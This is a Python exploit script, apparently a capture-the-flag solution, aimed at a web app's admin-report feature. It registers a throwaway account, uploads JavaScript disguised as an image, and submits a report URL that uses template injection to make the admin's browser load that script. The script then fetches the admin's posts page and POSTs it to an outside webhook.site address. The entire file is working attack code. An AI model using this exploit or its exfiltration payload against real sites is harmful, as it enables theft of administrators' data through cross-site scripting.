#! /usr/bin/python3
import requests
import bs4
import random
import string
from sys import argv
import os

PORT = 42694
HOST = os.getenv("HOST", "localhost")
BASEURL = f"http://{HOST}:{PORT}"
CONTAINER_NAME = "classic"
LOCAL = HOST == "localhost"
print(argv)
MYSITE = argv[1] if len(argv) > 1 else "https://webhook.site/d7ea2666-7e4b-420c-9039-bfc625f0e95e"
CSRF = ""


def retrieve_and_set_csrf(session: requests.Session):
    global CSRF
    SAMPLE_ENDPOINT = f"{BASEURL}/admin/report"
    document = session.get(SAMPLE_ENDPOINT).text
    parser = bs4.BeautifulSoup(document, 'html.parser')
    inputs = parser.select('input[name=csrf]')
    assert len(inputs) > 0
    CSRF = inputs[0]['value']
    print(CSRF)

def do_login(session: requests.Session):
    AUTH = {
        "username": ''.join(random.choice(string.ascii_letters) for i in range(16)),
        "password": ''.join(random.choice(string.ascii_letters) for i in range(16))}
    resp = session.post(
        f"{BASEURL}/user/register",
        data=AUTH,
        headers={"Content-Type": "application/x-www-form-urlencoded"})
    print(resp.text)
    resp = session.post(
        f"{BASEURL}/user/login",
        data=AUTH,
        headers={"Content-Type": "application/x-www-form-urlencoded"})
    print(resp.text)
    print("Session created: ", session.cookies.get('session'))


def make_post(session: requests.Session):
    ENDPOINT = f"{BASEURL}/post/new"
    TITLE = "Hacked"
    CONTENT = "Hacked"
    PAYLOAD = """
    let webhook = '%s';
    fetch("%s/post/view")
        .then((response) => response.text())
        .then((text) => {
            fetch(webhook, {
                method: "POST",
                body: text
            });
        });
    """ % (MYSITE, f"http://{CONTAINER_NAME}:{PORT}" if LOCAL else BASEURL)
    files = {
        'image': ('file.txt', PAYLOAD, 'application/octet-stream')
    }

    data = {
        "title": TITLE,
        "content": CONTENT,
        "csrf": CSRF
    }

    resp = session.post(ENDPOINT,
                        data=data,
                        files=files)
    print(resp.text)


def report_to_admin(session: requests.Session):
    ENDPOINT = f"{BASEURL}/admin/report"
    myposts = session.get(f"{BASEURL}/post/view").text
    parser = bs4.BeautifulSoup(myposts, 'html.parser')
    images = parser.select("img[src]")
    assert len(images) > 0
    uploadsrc = images[0]['src']

    PAYLOAD = '<script src="%s"></script>' % uploadsrc
    REPORT_URL = "%s/foo{{ request.args.foo | safe }}?foo=%s" % (
        f"http://{CONTAINER_NAME}:{PORT}" if LOCAL else BASEURL, PAYLOAD)

    print(images)

    data = {
        "url": REPORT_URL,
        "csrf": CSRF
    }
    resp = session.post(ENDPOINT,
                        data=data,
                        headers={"Content-Type": "application/x-www-form-urlencoded"})
    print(resp.text)


with requests.session() as s:
    do_login(s)
    retrieve_and_set_csrf(s)
    make_post(s)
    report_to_admin(s)
